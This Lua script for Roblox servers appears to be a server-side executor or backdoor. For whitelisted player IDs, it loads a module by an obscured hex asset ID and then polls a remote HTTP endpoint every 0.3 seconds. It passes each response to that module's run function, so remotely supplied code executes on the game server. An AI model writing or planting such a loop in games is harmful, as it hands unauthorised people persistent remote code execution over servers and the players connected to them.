local https = game:GetService("HttpService")
local plrs = game:GetService("Players")

local endpoint = "http://localhost:5000/"
local whitelist = https:JSONDecode(https:GetAsync(endpoint.."whitelist.json"))
local run = require(0x26E001F12)

local threads = {}

local function plrAdded(plr)
	if whitelist[tostring(plr.UserId)] then
		threads[tostring(plr.UserId)] = coroutine.create(function()
			while true do
				task.wait(0.3)
				pcall(function()
					local ping = https:GetAsync(endpoint.."api/ping", true, {["user-id"]=tostring(plr.UserId)})
					coroutine.wrap(function()
                        run(ping)
                    end)()
				end)
			end
		end)
		coroutine.resume(threads[tostring(plr.UserId)])
	end
end
local function plrRemoving(plr)
	if whitelist[tostring(plr.UserId)] then
		coroutine.close(threads[tostring(plr.UserId)])
		pcall(function()
			https:PostAsync(endpoint.."api/close", "", Enum.HttpContentType.TextPlain, false, {["user-id"]=tostring(plr.UserId)})
		end)
	end
end

for _, plr in pairs(plrs:GetPlayers()) do
    plrAdded(plr)
end
plrs.PlayerAdded:Connect(plrAdded)
plrs.PlayerRemoving:Connect(plrRemoving)

game:BindToClose(function()
    for _, plr in pairs(plrs:GetPlayers()) do 
        plrRemoving(plr)
    end
end)